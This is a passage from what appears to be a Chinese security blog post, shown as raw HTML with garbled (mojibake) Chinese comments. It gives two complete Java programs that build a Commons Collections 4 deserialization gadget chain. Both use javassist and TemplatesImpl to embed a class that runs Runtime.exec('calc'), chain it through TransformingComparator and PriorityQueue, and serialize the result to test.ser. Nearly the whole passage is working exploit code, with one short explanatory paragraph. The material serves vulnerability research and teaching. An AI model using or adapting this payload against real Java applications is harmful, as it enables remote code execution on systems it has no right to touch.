        cc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é€šè¿‡CtClass.makeClassInitializeræ–¹æ³•åœ¨å½“å‰ç±»åˆ›å»ºäº†ä¸€ä¸ªé™æ€ä»£ç å—</span>
        cc<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"Leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¿…é¡»è¦ç»§æ‰¿AbstractTransletç±»</span>
        <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–å­—èŠ‚ç </span>
        <span class="token comment">/* TemplatesImplåŠ è½½å­—èŠ‚ç  */</span>
        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºä¸€ä¸ªtemplateså¯¹è±¡</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_class"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>classBytes<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_tfactory"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ConstantTransformer</span> constantTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">InstantiateTransformer</span> instantiateTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"haha"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                constantTransformer<span class="token punctuation">,</span>
                instantiateTransformer
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/* åˆ›å»ºTransformingComparator */</span>
        <span class="token class-name">TransformingComparator</span> comparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/* åˆ›å»ºPriorityQueue */</span>
        <span class="token keyword">final</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//priorityQueue -> TransformingComparator.compare -> ChainedTransformer.transform</span>
        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//add elements</span>
        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>constantTransformer<span class="token punctuation">,</span><span class="token string">"iConstant"</span><span class="token punctuation">,</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//éœ€è¦åœ¨æœ€åä¸€æ­¥ä¿®æ”¹ï¼Œå¦åˆ™å‡ºé”™</span>

        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>instantiateTransformer<span class="token punctuation">,</span><span class="token string">"iParamTypes"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>instantiateTransformer<span class="token punctuation">,</span><span class="token string">"iArgs"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>templates<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/* å†™å‡ºåºåˆ—åŒ–æ–‡ä»¶ */</span>
        <span class="token class-name">ObjectOutputStream</span> outputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"test.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        outputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
        outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">final</span> <span class="token class-name">Field</span> field <span class="token operator">=</span> <span class="token function">getField</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Field</span> <span class="token function">getField</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> clazz<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            field <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
                field <span class="token operator">=</span> <span class="token function">getField</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> field<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆ‘ä»¬çŸ¥é“<code>PriorityQueue</code>åœ¨ä½¿ç”¨<code>add()</code>æ–¹æ³•çš„æ—¶å€™ï¼Œä¼šæ‰§è¡Œå…¶<code>comparator</code>ï¼Œå¯¼è‡´åˆ©ç”¨é“¾ä¼šåœ¨åºåˆ—åŒ–å‰å°±è¢«è§¦å‘è€Œç¨‹åºç»ˆæ­¢ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨addä¹‹åå†æŠŠæˆ‘ä»¬åˆ©ç”¨é“¾ç”¨åˆ°çš„ä¸œè¥¿æ”¾è¿›å»ã€‚ä¾‹å¦‚<code>constantTransformer</code>å’Œ<code>InstantiateTransformer</code>éƒ½æ˜¯å¦‚æ­¤ï¼Œæˆ‘ä»¬åœ¨addä¹‹åæ‰å¯¹ä»–ä»¬çš„å‚æ•°è¿›è¡Œä¿®æ”¹ã€‚</p>
<p>å› ä¸ºæˆ‘ä»¬åªéœ€è¦callåˆ°<code>chainedTransformer.transform()</code>æ–¹æ³•ï¼Œä¸éœ€è¦åƒcc2é“¾ä¸€æ ·è¦å‘<code>InvokerTransformer</code>ä¼ æ•°æ®ï¼Œå› æ­¤æˆ‘ä»¬ä¸éœ€è¦åœ¨<code>queue</code>ä¸­æ·»åŠ æ„é€ çš„<code>templates</code>äº†ã€‚</p>
<h4 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassClassPath</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonsCollections4Method2</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/* ç”Ÿæˆå­—èŠ‚ç  */</span>
        <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        classPool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> cc <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"Evil"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é€šè¿‡CtClass.makeClassInitializeræ–¹æ³•åœ¨å½“å‰ç±»åˆ›å»ºäº†ä¸€ä¸ªé™æ€ä»£ç å—</span>
        cc<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"Leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¿…é¡»è¦ç»§æ‰¿AbstractTransletç±»</span>
        <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–å­—èŠ‚ç </span>
        <span class="token comment">/* TemplatesImplåŠ è½½å­—èŠ‚ç  */</span>
        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºä¸€ä¸ªtemplateså¯¹è±¡</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_class"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>classBytes<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_tfactory"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>templates<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/* åˆ›å»ºTransformingComparator */</span>
        <span class="token class-name">TransformingComparator</span> comparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/* åˆ›å»ºPriorityQueue */</span>
        <span class="token keyword">final</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//priorityQueue -> TransformingComparator.compare -> ChainedTransformer.transform</span>
        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//add elements</span>
        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span><span class="token string">"comparator"</span><span class="token punctuation">,</span>comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/* å†™å‡ºåºåˆ—åŒ–æ–‡ä»¶ */</span>
        <span class="token class-name">ObjectOutputStream</span> outputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"test.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        outputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
        outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">final</span> <span class="token class-name">Field</span> field <span class="token operator">=</span> <span class="token function">getField</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Field</span> <span class="token function">getField</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> clazz<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            field <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
                field <span class="token operator">=</span> <span class="token function">getField</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> field<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

